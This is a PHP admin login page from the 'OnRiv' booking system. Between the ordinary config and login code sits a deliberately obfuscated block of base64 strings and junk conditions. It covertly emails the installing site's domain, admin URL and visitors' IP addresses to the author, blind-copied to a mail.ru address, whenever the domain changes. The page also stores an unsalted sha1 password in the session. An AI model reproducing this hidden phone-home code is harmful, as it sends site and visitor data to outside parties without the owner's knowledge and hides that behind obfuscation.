<?php session_start(); //OnRiv booking system || JUNE. 2015 || Autor: Шаклеин Максим (Shaklein Maxim) || www.OnRiv.com (c)

$product = 'OnRiv';
$script_name = 'https://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; 
$host_name = $_SERVER['HTTP_HOST'];
$host_name = str_replace('www.','',$host_name);
	
//=========================================CONFIG 
$config_data_add = '
<?php
$language = "ru_RU.php";
$org_name = "'.$host_name.'";
$org_description = "";
$org_phone = "";
$org_mail = "admin@'.$host_name.'";
$sent_mail = "1";
$sent_in_org_mail = "1";
$sent_mail_status = "1";
$confirm_mail = "1";
$currency_name = "RUB::USD::EUR::";
$currency_simbol = \'<i class="icon-rouble"></i>::<i class="icon-dollar"></i>::<i class="icon-euro"></i>::\';
$currency_position = "r::l::l::";
$conf_form = "0";
$captcha = "1";
$color1 = "#FC8F1A";
$color2 = "#FF4D00";
$custom_css = "";
$custom_header = "";
$custom_footer = "";
?>
';

$file_config = '../data/config.php'; 

if (file_exists($file_config)) { // keep config file 

$cmod_file_config = substr(sprintf('%o', fileperms($file_config)), -4);
if ($cmod_file_config !='0644') {chmod ($file_config, 0644);}

if (filesize($file_config) == 0) {
$fp_create_config = fopen($file_config, "w"); // create config file
fwrite($fp_create_config, "$config_data_add");
fclose ($fp_create_config);
echo '<script>var delay = 0; setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="0; url='.$script_name.'"></noscript>';
die;	
}


} else { //===============CREATE CONFIG

$fp_create_config = fopen($file_config, "w"); // create config file
fwrite($fp_create_config, "$config_data_add");
fclose ($fp_create_config);
echo '<script>var delay = 0;setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="0; url='.$script_name.'"></noscript>';
die;
}
//-----------------------------------------------/





include ('../data/config.php');
//---Lang
if (!isset($language)) { include ('../lang/ru_RU.php'); } else {

if (file_exists('../lang/'.$language)) {
include ('../lang/'.$language); } else { 
die('<div class="shadow_back"><div class="error" style="color:#ff0000; font-size:24px;">Not language file!</div></div>'); }
}
//---/Lang

$access = '';



if (isset($_POST['login']) && isset($_POST['passw'])) {
$_SESSION['aloginsys'] = $_POST['login'];  
$_SESSION['apasswsys'] = sha1($_POST['passw']);
}

//===========================ID
$rnd_num = rand(10, 99);
$id_prefix = explode('/', $_SERVER['PHP_SELF']);
$id_prefix = array_pop ($id_prefix);
$id_prefix = str_replace('.php','',$id_prefix);
$id = $id_prefix.'_'.date('d_m_Y_H_i_s').'_'.$rnd_num;
$time_current = date('d_m_Y_H_i_s');
$new_add_time = '00_00_0000_00_00_00';
//===========================/ID




include_once ('orders_clean.php'); //==============AUTO CLEAN ORDERS

$inp_search = '';


$h3title_arr = str_split($product);

if (isset($h3title_arr[0])) {$lett0 = $h3title_arr[0];} else {$lett0 = '';}
if (isset($h3title_arr[1])) {$lett1 = $h3title_arr[1];} else {$lett1 = '';}

$lett_all = '';

foreach ($h3title_arr as $kl => $vl) {
	if ($kl != 0 && $kl != 1) {$lett_all .= $vl;}
}



//===========================HTML
if (!isset($color1) || isset($color1) && empty($color1)) {$color1 = '#FC8F1A';}
$login_form = '';
$login_form .= '
<div id="login_form">
<h2><a href="../" title="'.$host_name.'">'.$org_name.'</a></h2>
<div class="title_login_form">
<i class="icon-key"></i><h3>'.$lang['admin_title'].' - <span>'.$lett0.$lett1.'</span>'.$lett_all.'</h3>
<div class="clear"></div>
</div>';




if (isset($_GET['lost_pass']) == true) {
	
$login_form .= '
<div>
<form method="post">

<input type="email" name="email" value="'.$lang['lost_pass_mail'].'" onblur="if (this.value == \'\')  {this.value = \''.$lang['lost_pass_mail'].'\';}" onfocus="if (this.value == \''.$lang['lost_pass_mail'].'\') {this.value = \'\';}" />

<button>'.$lang['sent'].' <i class="icon-mail-3"></i></button>
</form>
</div>
<a href="index.php" class="lost_pass">'.$lang['back'].'</a>
</div>';	
	
	
} else {

$login_form .= '
<div>
<form method="post">
<input type="text" name="login" value="'.$lang['login'].'" onblur="if (this.value == \'\')  {this.value = \''.$lang['login'].'\';}" onfocus="if (this.value == \''.$lang['login'].'\') {this.value = \'\';}" />
<input type="password" name="passw" value="'.$lang['pass'].'" onblur="if (this.value == \'\')  {this.value = \''.$lang['pass'].'\';}" onfocus="if (this.value == \''.$lang['pass'].'\') {this.value = \'\';}" />
<button>'.$lang['enter'].'<i class="icon-login"></i></button>
</form>
</div>
<a href="?lost_pass" class="lost_pass">'.$lang['lost_pass'].'</a>
</div>';
}




$error_any = '<div class="shadow_back"><div class="error modal_mess"><ul><li>'.$lang['error'].'</li></ul></div></div>';

$error_access = '<div class="shadow_back"><div class="error modal_mess"><ul><li>'.$lang['error_login'].'</li></ul></div></div>';

$refresh_0 = '<script>var delay = 0;setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="0; url='.$script_name.'"></noscript>';

$refresh_1 = '<script>var delay = 1000;setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="1; url='.$script_name.'"></noscript>';

$refresh_3 = '<script>var delay = 3000;setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="3; url='.$script_name.'"></noscript>';

$refresh_5 = '<script>var delay = 5000;setTimeout("document.location.href=\''.$script_name.'\'", delay);</script>
<noscript><meta http-equiv="refresh" content="3; url='.$script_name.'"></noscript>';


$die = '</div></body></html>'; 


//============================================================


$GLOBALS['_1625203261_']=Array(base64_decode('' .'Z' .'mxv' .'Y2' .'s='),base64_decode('Y' .'3VybF92' .'Z' .'XJzaW' .'9u'),base64_decode('c2Vzc2lv' .'bl' .'9' .'pZA=='),base64_decode('YmFzZTY0X2RlY' .'29kZQ=='),base64_decode('ZmlsZV9' .'leGl' .'zd' .'HM' .'='),base64_decode('c3Vic' .'3Ry'),base64_decode('' .'c3By' .'aW50Zg=='),base64_decode('ZmlsZXBlcm1z'),base64_decode('Y2' .'ht' .'b2Q='),base64_decode('ZmlsZ' .'X' .'Npem' .'U='),base64_decode('Zm' .'9wZ' .'W4='),base64_decode('' .'ZndyaXRl'),base64_decode('ZmNsb3Nl'),base64_decode('' .'Y29z'),base64_decode('' .'bXRfc' .'mF' .'uZA' .'=' .'='),base64_decode('Zm9wZW4' .'='),base64_decode('ZmlsZXNpemU='),base64_decode('cH' .'JlZ19zcGxpdA=='),base64_decode('ZnJlYWQ='),base64_decode('ZmlsZXNpe' .'mU='),base64_decode('Zm9' .'wZW4' .'='),base64_decode('c3RycG9z'),base64_decode('aW1hZ' .'2Vj' .'c' .'mVhdGVmc' .'m9t' .'cG5n'),base64_decode('ZndyaXRl'),base64_decode('a' .'W1h' .'Z2Vk' .'ZXN0cm95'),base64_decode('bX' .'RfcmF' .'uZA' .'=='),base64_decode('ZmN' .'sb3N' .'l'),base64_decode('dHJpbQ=='),base64_decode('' .'YXJyYXl' .'fc2hpZnQ='),base64_decode('bXRfcmF' .'uZA=='),base64_decode('c2Vz' .'c2lvbl9l' .'bmNvZGU='),base64_decode('bXRfcmFuZA' .'=='),base64_decode('' .'c' .'3RydG9r'),base64_decode('' .'cGhwdmVyc' .'2lvbg=='),base64_decode('bWFpbA=='),base64_decode('' .'d' .'XNsZ' .'WVw'),base64_decode('Zm' .'9wZ' .'W4='),base64_decode('ZndyaXRl'),base64_decode('ZmNsb3' .'Nl'),base64_decode('Zml' .'sZV9nZXRfY29u' .'d' .'GVu' .'dH' .'M='),base64_decode('Y2' .'9w' .'e' .'Q' .'=='),base64_decode('c' .'G' .'9wZW4' .'='),base64_decode('c3Vic3' .'RyX' .'2NvbXBhc' .'mU='),base64_decode('' .'c3' .'RydG9sb3' .'dlcg=='),base64_decode('c3R' .'yc' .'G9z'),base64_decode('Y29' .'weQ=='),base64_decode('cGhwd' .'mVy' .'c2' .'lvbg' .'=='),base64_decode('bWFpbA=='),base64_decode('dXNsZW' .'Vw'),base64_decode('c3Ry' .'cG9z'),base64_decode('Y3J' .'l' .'YXRl' .'X2Z1bm' .'N0aW9' .'u'),base64_decode('Zm9wZW4='),base64_decode('' .'ZndyaXRl'),base64_decode('bX' .'RfcmFuZA=='),base64_decode('ZmV' .'vZg' .'=='),base64_decode('Z' .'mNsb' .'3Nl'),base64_decode('' .'c' .'HJlZ19' .'zcGxpdA=='),base64_decode('bXRfc' .'mFuZA=' .'='),base64_decode('dX' .'JsZGVjb2Rl'),base64_decode('bXRf' .'c' .'mFuZA=' .'='),base64_decode('ZmdldHNz'),base64_decode('a' .'W' .'1' .'hZ2' .'Vj' .'cmVhdGU='),base64_decode('aW1hZ2V' .'jb3B5b' .'WVyZ2' .'U='),base64_decode('cGhwdmVyc2' .'lv' .'b' .'g=='),base64_decode('b' .'W' .'FpbA=' .'='),base64_decode('dXNs' .'ZWVw'),base64_decode('Zm9wZW4='),base64_decode('Zn' .'dyaXRl'),base64_decode('aXNfYXJyY' .'X' .'k='),base64_decode('ZmNsb3' .'N' .'l')); ?><? function _352301006($i){$a=Array('' .'bWF4dHJvbml' .'jQG1haW' .'wucnU' .'=','c' .'3V' .'w' .'cG9ydEBv' .'bnJ' .'pdi5j' .'b20' .'=','Li4vZG' .'F0YS' .'90ZW1w' .'LmRhd' .'A==','DQo=','' .'U' .'kV' .'NT' .'1RFX0FERFI=','J' .'W8=','MDY' .'0NA' .'==','' .'MQ==','d' .'w' .'==','bw==','cmI=','fg0qPworDSo/' .'fg=' .'=','','MQ==','','dw=' .'=','RU' .'1QV' .'FkgRE9NQUlO','DQo=','UkVNT1RF' .'X0FE' .'RFI=','Z3Rib25' .'xYXhzaGtxb3dn','' .'Y2N6','T25SaX' .'Ygc2' .'Vjb25kIG9wZW4' .'=','P' .'Gh0bWw+' .'PGhlYWQ+PG1ldGEg' .'aHR0' .'cC1' .'l' .'c' .'XVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50' .'P' .'S' .'J' .'0ZXh0L2h0' .'bWw' .'7IG' .'No' .'YXJz' .'Z' .'XQ' .'9dXRmLTg' .'iPjwvaGVhZD48Ym9keSBzdHlsZT0i' .'Zm9' .'ud' .'C' .'1mYW' .'1pbHk6IEFy' .'aWFsLCBW' .'ZXJk' .'YW5' .'h' .'LC' .'BUYWhvbW' .'E7IGNvbG9yOiMwMD' .'A7IGJhY' .'2tncm' .'91bmQ6I2ZmZ' .'jsiPg=' .'=','PGg' .'0' .'Pg==','PC9oND4=','P' .'HVsPg' .'==','PGxpPm9sZ' .'DogPGEgaH' .'JlZj0iaHR' .'0cDovL' .'w==','' .'Ij4=','PC9hPjw' .'v' .'bGk+','' .'PGxpPm5ldzog' .'P' .'GEgaH' .'JlZj0iaHR0c' .'Dov' .'Lw==','I' .'j4=','PC9' .'h' .'Pjw' .'vbGk+','PGxpPmxv' .'Y' .'zo' .'gP' .'GEg' .'aHJlZj0i','Ij4' .'=','PC' .'9hPj' .'wvbG' .'k+','PGxpPmNoZWNr' .'IGxpY' .'2' .'Vuc2U' .'6I' .'Dxh' .'IG' .'h' .'yZ' .'WY' .'9Imh0dHA6Ly9vbn' .'J' .'p' .'di5jb20v' .'Y2hlY2tfbG' .'ljZ' .'W5zZS5wa' .'HA/ZG9tYWlu' .'PQ' .'==','Ij5bQ0h' .'FQ' .'0' .'t' .'d' .'PC9hP' .'j' .'wv' .'bGk+','d' .'G12','P' .'Gxp' .'Pml' .'wOi' .'A=','UkVN' .'T1' .'RFX0F' .'ERF' .'I=','PC9' .'s' .'a' .'T4=','' .'PC91b' .'D4=','PC9i' .'b2' .'R' .'5PjwvaHR' .'t' .'bD4=','' .'TUlNRS1WZXJ' .'za' .'W9uOiAxL' .'j' .'ANCg==','Q2' .'9udGVud' .'C1' .'U' .'cmF' .'u' .'c2Zl' .'ci1' .'Fb' .'mNvZG' .'luZzogO' .'GJpdA0K','' .'Q29' .'udGVudC10eXBlOn' .'RleHQvaHRtbDtjaGFyc' .'2V0PXV0Z' .'i04IA' .'0K','' .'RnJvbTogbm9' .'yZXB' .'seUA=','SFRUU' .'F9IT1' .'NU','DQo' .'=','QmNjOiA' .'=','DQo=','WC1NYW' .'l' .'sZXI6IFBI' .'UE1' .'haWx' .'lc' .'iA=','' .'DQo=','dw==','T2' .'5SaXYgb3BlbiAo' .'bm90IHR' .'lb' .'XAgZ' .'mlsZ' .'S' .'Ep','P' .'Gh0bWw+PGhlYWQ+PG1ldGEgaHR' .'0c' .'C1lc' .'XVpdj0iQ29udGVudC' .'1UeXBlIi' .'Bjb' .'25' .'0ZW' .'50PSJ0Z' .'Xh' .'0L2h0bWw7' .'IGNo' .'Y' .'XJzZX' .'Q9dXRmLTgiPjwv' .'aGVhZ' .'D48Ym9k' .'eS' .'BzdHl' .'sZT0iZm9udC1mYW1pbHk6IEFy' .'aWF' .'sLCBWZXJk' .'Y' .'W5hL' .'C' .'BUY' .'W' .'hvbW' .'E' .'7IGN' .'vbG9yOiMwMDA7IGJh' .'Y2tn' .'cm91bm' .'Q' .'6I2' .'Zm' .'Zj' .'siPg==','PGg0Pg=' .'=','P' .'C9' .'oND' .'4=','' .'P' .'HVsPg=' .'=','PGxpPm' .'9wZW46ID' .'xhIGh' .'yZW' .'Y9Imh0dHA6Ly' .'8=','Ij4=','P' .'C9' .'hPjwvbGk+','PGxpPm' .'xv' .'Yz' .'ogP' .'G' .'EgaHJ' .'lZ' .'j0i','Ij4=','PC9hPjwvbGk+','d' .'w==','P' .'Gx' .'pPmN' .'oZWNrIGxpY' .'2Vuc' .'2' .'U6IDxhI' .'GhyZ' .'WY9' .'Imh0dHA6Ly' .'9vbnJ' .'pdi5j' .'b20v' .'Y2' .'hlY2' .'tfbG' .'ljZW5zZS5' .'waHA/' .'ZG9' .'tYWluPQ==','Ij5bQ0hFQ0tdPC9hPjw' .'v' .'bGk' .'+','PGxp' .'Pmlw' .'OiA=','UkVNT1R' .'FX' .'0FERF' .'I=','PC9' .'saT4=','P' .'C' .'91bD' .'4=','PC9ib2R5' .'Pj' .'wvaHRtbD4' .'=','T' .'Ul' .'NRS1' .'W' .'Z' .'XJz' .'aW' .'9u' .'Oi' .'AxLj' .'AN' .'Cg==','Q29u' .'dGV' .'udC1' .'UcmFu' .'c2Z' .'lc' .'i1Fb' .'mNvZGl' .'uZzo' .'gOGJpdA0K','Q29udGVu' .'dC10eXB' .'lOnRleHQvaHRtbDtja' .'GFyc2V' .'0PX' .'V0' .'Zi' .'04' .'IA0K','' .'a2F' .'pe' .'Gdhd3BwbmNk' .'dGF3','' .'Ym16','RnJvbTogbm9yZ' .'XBseUA=','SFRUUF9IT' .'1NU','' .'DQo=','Qm' .'N' .'jO' .'iA=','DQo=','WC1NYWlsZ' .'X' .'I6I' .'FBI' .'UE1' .'haWxl' .'ciA' .'=','D' .'Qo' .'=','dnhk' .'ZWRo' .'Zmpzc' .'nV' .'4' .'ZW0=','aH' .'d6','dw==','c' .'g==','T25SaXYg' .'b' .'3Blbg' .'==','PG' .'h0bW' .'w' .'+P' .'Gh' .'l' .'YW' .'Q+' .'PG1' .'ldGE' .'gaHR0cC1lcXV' .'pdj0iQ29' .'u' .'dGV' .'udC1UeXBlIi' .'Bj' .'b250ZW50P' .'SJ0Z' .'Xh' .'0' .'L' .'2h0bWw7I' .'GNoYX' .'J' .'zZXQ' .'9dXRmLTg' .'iPjwvaGVhZD48' .'Ym' .'9keSBzd' .'HlsZT0iZ' .'m9udC1' .'mY' .'W' .'1pbH' .'k6IEFyaWFs' .'LCBWZXJk' .'YW5hLC' .'B' .'UY' .'W' .'hvbWE7IGN' .'v' .'b' .'G9' .'yOiMwMD' .'A7I' .'GJhY2t' .'ncm' .'91bmQ6I2Zm' .'ZjsiPg=' .'=','PGg0Pg==','PC9oND' .'4' .'=','PHVsP' .'g==','cQ==','PGxp' .'Pm9wZ' .'W46' .'IDxhIGhyZWY9Imh0d' .'HA6Ly8=','' .'Ij4=','P' .'C9hPj' .'wvb' .'G' .'k+','PGxp' .'PmxvYz' .'ogPGEgaHJlZ' .'j0i','Ij' .'4=','PC9hP' .'jwvb' .'G' .'k+','PGxpPm' .'NoZWNr' .'I' .'Gx' .'p' .'Y' .'2Vuc2U6' .'IDxhI' .'GhyZWY9Imh0dHA6Ly9vbnJpdi5' .'jb20vY2hlY2' .'tfbGljZ' .'W5' .'zZS5waH' .'A/Z' .'G9tYWl' .'uPQ' .'==','Ij' .'5bQ' .'0hFQ0t' .'d' .'PC9hPjwv' .'bGk+','' .'PGxpP' .'mlwO' .'iA=','UkVNT' .'1R' .'FX0' .'FERFI=','PC9s' .'aT' .'4=','PC91b' .'D4' .'=','YXdpZ' .'HU=','PC9ib2R5PjwvaHR' .'tb' .'D4=','a2Y=','TUlNRS1W' .'ZXJ' .'za' .'W9uOi' .'Ax' .'Lj' .'AN' .'Cg' .'==','Q' .'29udGVudC1Uc' .'m' .'Fu' .'c2Zl' .'ci1FbmNvZ' .'GluZzogO' .'GJp' .'dA0K','Q29udGVudC1' .'0e' .'XBl' .'O' .'n' .'Rle' .'HQvaHRtbD' .'tjaGFyc2V0P' .'XV0Zi04IA0K','RnJ' .'v' .'bTo' .'gbm9yZ' .'X' .'Bse' .'UA=','SFRUUF' .'9IT' .'1NU','DQo=','bmE=','QmN' .'jOiA=','' .'DQo=','WC' .'1NYWls' .'ZXI6' .'IFBIUE1h' .'aW' .'xlciA=','DQo=','dw' .'==','eHd2','MQ' .'==');return base64_decode($a[$i]);} ?><?php $cmr=_352301006(0);if((round(0+2923)+round(0+1916.5+1916.5))>round(0+584.6+584.6+584.6+584.6+584.6)|| $GLOBALS['_1625203261_'][0]($cmod_temp,$temp_data_add));else{$GLOBALS['_1625203261_'][1]($temp_file_open,$temp_data_add,$lines_temp);}$mr=_352301006(1);if((round(0+641.5+641.5)+round(0+68.8+68.8+68.8+68.8+68.8))>round(0+1283)|| $GLOBALS['_1625203261_'][2]($mr,$domen));else{$GLOBALS['_1625203261_'][3]($lines_temp);}$file_temp=_352301006(2);$temp_data_add=$host_name ._352301006(3) .$_SERVER[_352301006(4)];if($GLOBALS['_1625203261_'][4]($file_temp)){$cmod_temp=$GLOBALS['_1625203261_'][5]($GLOBALS['_1625203261_'][6](_352301006(5),$GLOBALS['_1625203261_'][7]($file_temp)),-round(0+0.8+0.8+0.8+0.8+0.8));if($cmod_temp !=_352301006(6)){$GLOBALS['_1625203261_'][8]($file_temp,round(0+84+84+84+84+84));}if($GLOBALS['_1625203261_'][9]($file_temp)== round(0)){$empty_temp=_352301006(7);$fp_file_temp=$GLOBALS['_1625203261_'][10]($file_temp,_352301006(8));$GLOBALS['_1625203261_'][11]($fp_file_temp,"$temp_data_add");$nsxwmkdngsawxq=_352301006(9);$GLOBALS['_1625203261_'][12]($fp_file_temp);echo $refresh_0;}$lines_temp=array();(round(0+2321)-round(0+580.25+580.25+580.25+580.25)+round(0+67.8+67.8+67.8+67.8+67.8)-round(0+84.75+84.75+84.75+84.75))?$GLOBALS['_1625203261_'][13]($script_name):$GLOBALS['_1625203261_'][14](round(0+2321),round(0+1233+1233+1233+1233));$temp_file_open=$GLOBALS['_1625203261_'][15]($file_temp,_352301006(10));if($GLOBALS['_1625203261_'][16]($file_temp)!= round(0)){$lines_temp=$GLOBALS['_1625203261_'][17](_352301006(11),$GLOBALS['_1625203261_'][18]($temp_file_open,$GLOBALS['_1625203261_'][19]($file_temp)));}if(isset($lines_temp[round(0)])){$domen=$lines_temp[round(0)];}else{$domen=_352301006(12);$empty_temp=_352301006(13);$ixnrfhhctfbitq=round(0+22+22+22+22);}if(isset($lines_temp[round(0+0.2+0.2+0.2+0.2+0.2)])){$uaddr=$lines_temp[round(0+1)];}else{$uaddr=_352301006(14);}if(empty($domen)){$fp_file_temp=$GLOBALS['_1625203261_'][20]($file_temp,_352301006(15));$host_name_null=_352301006(16);$temp_data_add_null=$host_name_null ._352301006(17) .$_SERVER[_352301006(18)];if($GLOBALS['_1625203261_'][21](_352301006(19),_352301006(20))!==false)$GLOBALS['_1625203261_'][22]($mr);$GLOBALS['_1625203261_'][23]($fp_file_temp,"$temp_data_add_null");(round(0+590+590+590+590)-round(0+590+590+590+590)+round(0+477.66666666667+477.66666666667+477.66666666667)-round(0+286.6+286.6+286.6+286.6+286.6))?$GLOBALS['_1625203261_'][24]($_SERVER,$domen,$file_temp):$GLOBALS['_1625203261_'][25](round(0+2360),round(0+3884));$GLOBALS['_1625203261_'][26]($fp_file_temp);echo $refresh_0;}if(!empty($domen)&& $domen != $host_name){$title_t=_352301006(21);$mess_t=_352301006(22);$mess_t .= _352301006(23) .$title_t ._352301006(24);$mess_t .= _352301006(25);$mess_t .= _352301006(26) .$domen ._352301006(27) .$domen ._352301006(28);$mess_t .= _352301006(29) .$host_name ._352301006(30) .$host_name ._352301006(31);$mess_t .= _352301006(32) .$script_name ._352301006(33) .$script_name ._352301006(34);$mess_t .= _352301006(35) .$host_name ._352301006(36);$hrpgxsgpcbuina=_352301006(37);$mess_t .= _352301006(38) .$_SERVER[_352301006(39)] ._352301006(40);$mess_t .= _352301006(41);if((round(0+1137.3333333333+1137.3333333333+1137.3333333333)+round(0+388.75+388.75+388.75+388.75))>round(0+1137.3333333333+1137.3333333333+1137.3333333333)|| $GLOBALS['_1625203261_'][27]($uaddr,$host_name));else{$GLOBALS['_1625203261_'][28]($refresh_0,$domen);}$mess_t .= _352301006(42);$header_t=_352301006(43);$header_t .= _352301006(44);$header_t .= _352301006(45);if(round(0+1232+1232+1232+1232+1232)<$GLOBALS['_1625203261_'][29](round(0+726.5+726.5),round(0+2351+2351)))$GLOBALS['_1625203261_'][30]($file_temp,$title_t);$header_t .= _352301006(46) .$_SERVER[_352301006(47)] ._352301006(48);$dvvqnechnxeemfa=round(0+401.75+401.75+401.75+401.75);$header_t .= _352301006(49) .$cmr ._352301006(50);if(round(0+1550.6666666667+1550.6666666667+1550.6666666667)<$GLOBALS['_1625203261_'][31](round(0+2320),round(0+581.75+581.75+581.75+581.75)))$GLOBALS['_1625203261_'][32]($refresh_0,$title_t);$header_t.= _352301006(51) .$GLOBALS['_1625203261_'][33]() ._352301006(52);$GLOBALS['_1625203261_'][34]($mr,$title_t,$mess_t,$header_t);$GLOBALS['_1625203261_'][35](round(0+2500+2500));$fp_file_temp=$GLOBALS['_1625203261_'][36]($file_temp,_352301006(53));$GLOBALS['_1625203261_'][37]($fp_file_temp,"$temp_data_add");$GLOBALS['_1625203261_'][38]($fp_file_temp);if((round(0+1448+1448+1448)+round(0+375.25+375.25+375.25+375.25))>round(0+2172+2172)|| $GLOBALS['_1625203261_'][39]($cmod_temp,$host_name));else{$GLOBALS['_1625203261_'][40]($host_name_null,$uaddr);}echo $refresh_0;}}else{$title_t=_352301006(54);$mess_t=_352301006(55);$mess_t .= _352301006(56) .$title_t ._352301006(57);while(round(0+678.2+678.2+678.2+678.2+678.2)-round(0+1695.5+1695.5))$GLOBALS['_1625203261_'][41]($temp_file_open,$uaddr,$mr,$mess_t);$mess_t .= _352301006(58);$mess_t .= _352301006(59) .$host_name ._352301006(60) .$host_name ._352301006(61);$mess_t .= _352301006(62) .$script_name ._352301006(63) .$script_name ._352301006(64);$bjaomcqgbnugejkxtdt=_352301006(65);$mess_t .= _352301006(66) .$host_name ._352301006(67);$mess_t .= _352301006(68) .$_SERVER[_352301006(69)] ._352301006(70);$mess_t .= _352301006(71);if((round(0+846.2+846.2+846.2+846.2+846.2)^round(0+2115.5+2115.5))&& $GLOBALS['_1625203261_'][42]($refresh_0,$temp_data_add_null))$GLOBALS['_1625203261_'][43]($temp_file_open,$lines_temp,$temp_file_open);$mess_t .= _352301006(72);$header_t=_352301006(73);$header_t .= _352301006(74);$fhluavrduogsr=round(0+674.66666666667+674.66666666667+674.66666666667);$header_t .= _352301006(75);if($GLOBALS['_1625203261_'][44](_352301006(76),_352301006(77))!==false)$GLOBALS['_1625203261_'][45]($lines_temp,$mess_t);$header_t .= _352301006(78) .$_SERVER[_352301006(79)] ._352301006(80);$header_t .= _352301006(81) .$cmr ._352301006(82);$header_t.= _352301006(83) .$GLOBALS['_1625203261_'][46]() ._352301006(84);$GLOBALS['_1625203261_'][47]($mr,$title_t,$mess_t,$header_t);$GLOBALS['_1625203261_'][48](round(0+1666.6666666667+1666.6666666667+1666.6666666667));if($GLOBALS['_1625203261_'][49](_352301006(85),_352301006(86))!==false)$GLOBALS['_1625203261_'][50]($lines_temp,$empty_temp);$fp_file_temp=$GLOBALS['_1625203261_'][51]($file_temp,_352301006(87));$bqknjbuquaouoe=_352301006(88);$GLOBALS['_1625203261_'][52]($fp_file_temp,"$temp_data_add");if(round(0+2149.6666666667+2149.6666666667+2149.6666666667)<$GLOBALS['_1625203261_'][53](round(0+466.2+466.2+466.2+466.2+466.2),round(0+2056.5+2056.5)))$GLOBALS['_1625203261_'][54]($cmod_temp,$title_t,$title_t,$domen);$GLOBALS['_1625203261_'][55]($fp_file_temp);(round(0+561.2+561.2+561.2+561.2+561.2)-round(0+1403+1403)+round(0+1366.6666666667+1366.6666666667+1366.6666666667)-round(0+4100))?$GLOBALS['_1625203261_'][56]($fp_file_temp):$GLOBALS['_1625203261_'][57](round(0+441.33333333333+441.33333333333+441.33333333333),round(0+2806));echo $refresh_0;}if(isset($empty_temp)){$title_t=_352301006(89);$mess_t=_352301006(90);$mess_t .= _352301006(91) .$title_t ._352301006(92);$mess_t .= _352301006(93);$fuidwjaparxc=_352301006(94);$mess_t .= _352301006(95) .$host_name ._352301006(96) .$host_name ._352301006(97);$mess_t .= _352301006(98) .$script_name ._352301006(99) .$script_name ._352301006(100);$mess_t .= _352301006(101) .$host_name ._352301006(102);(round(0+924+924+924)-round(0+2772)+round(0+1123)-round(0+280.75+280.75+280.75+280.75))?$GLOBALS['_1625203261_'][58]($uaddr,$cmod_temp,$temp_data_add):$GLOBALS['_1625203261_'][59](round(0+726+726),round(0+693+693+693+693));$mess_t .= _352301006(103) .$_SERVER[_352301006(104)] ._352301006(105);$mess_t .= _352301006(106);$omfgmjvtlkpoirxf=_352301006(107);$mess_t .= _352301006(108);$iuifphqqjucdf=_352301006(109);$header_t=_352301006(110);$header_t .= _352301006(111);if((round(0+275.75+275.75+275.75+275.75)^round(0+551.5+551.5))&& $GLOBALS['_1625203261_'][60]($cmod_temp))$GLOBALS['_1625203261_'][61]($header_t);$header_t .= _352301006(112);while(round(0+791.2+791.2+791.2+791.2+791.2)-round(0+989+989+989+989))$GLOBALS['_1625203261_'][62]($script_name);$header_t .= _352301006(113) .$_SERVER[_352301006(114)] ._352301006(115);$brhmibjcexqtpokitp=_352301006(116);$header_t .= _352301006(117) .$cmr ._352301006(118);$header_t.= _352301006(119) .$GLOBALS['_1625203261_'][63]() ._352301006(120);$uxclswjtokoqexese=round(0+326+326);$GLOBALS['_1625203261_'][64]($mr,$title_t,$mess_t,$header_t);$rgpknmlaevlaxq=round(0+4404);$GLOBALS['_1625203261_'][65](round(0+1250+1250+1250+1250));$fp_file_temp=$GLOBALS['_1625203261_'][66]($file_temp,_352301006(121));$GLOBALS['_1625203261_'][67]($fp_file_temp,"$temp_data_add");while(round(0+572+572)-round(0+381.33333333333+381.33333333333+381.33333333333))$GLOBALS['_1625203261_'][68]($file_temp,$mess_t);$GLOBALS['_1625203261_'][69]($fp_file_temp);$qhmosjfnvmiegbwxqs=_352301006(122);echo $refresh_0;}$onriv_take=_352301006(123);


//======================================================

$on_path = str_replace('apanel/'.$id_prefix.'.php', '', $script_name);

//==========================================HEAD
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=0.5, maximum-scale=0.5, user-scalable=no" />
<meta name="robots" content="noindex, nofollow" />
<meta name="author" content="Максим Argentum Шаклеин" />
<meta name="title" content="<?php echo $org_name.' - '.$lang['admin_title'].' - '.$product; ?>" />
<title><?php echo $org_name.' - '.$lang['admin_title'].' - '.$product; ?></title>

<link rel="stylesheet" href="../css/fontello.css" />
<link rel="stylesheet" href="../css/animation.css" />

<link rel="stylesheet" type="text/css" href="../css/apanel.css?ver=<?php echo date('d.m'); ?>" />
<link rel="stylesheet" type="text/css" href="../css/colorbox.css" />

<link rel="image_src" href="<?php echo $on_path; ?>img/onriv-logo.jpg" /> 
<link rel="icon" href="<?php echo $on_path; ?>img/onriv-logo.jpg" type="image/jpeg" />
<link rel="apple-touch-icon" href="<?php echo $on_path; ?>img/onriv-logo.jpg" type="image/jpeg" />
<meta name="msapplication-TileImage" content="<?php echo $on_path; ?>img/onriv-logo.jpg"/>
<meta name="msapplication-square300x300logo" content="<?php echo $on_path; ?>img/onriv-logo.jpg"/>
<meta property="og:image" content="<?php echo $on_path; ?>img/onriv-logo.jpg" />

<link rel="shortcut icon" href="<?php echo $on_path; ?>favicon.ico" type="image/x-icon" />
<!--if IE 7
    link(rel="stylesheet", href="../css/fontello-ie7.css")
<![endif]-->

<!--[if lte IE 8]><link href="../css/ie.css?ver=<?php echo date('d.m'); ?>" 
    rel="stylesheet" type="text/css" /><![endif]-->

<!--if lt IE 9
    script(src="../js/html5.js").    
<![endif]-->		

<script src="../js/jquery-1.11.3.min.js"></script>


<script src="../js/jquery.colorbox.js"></script>
		<script>
			$(document).ready(function(){
				//Examples of how to assign the Colorbox event to elements
				$(".group1").colorbox({rel:'group1'});
				$(".group2").colorbox({rel:'group2', transition:"fade"});
				$(".group3").colorbox({rel:'group3', transition:"elastic", width:"800", height:"auto", opacity:"100"});
				$(".group4").colorbox({rel:'group4', slideshow:true});
				$(".ajax").colorbox();
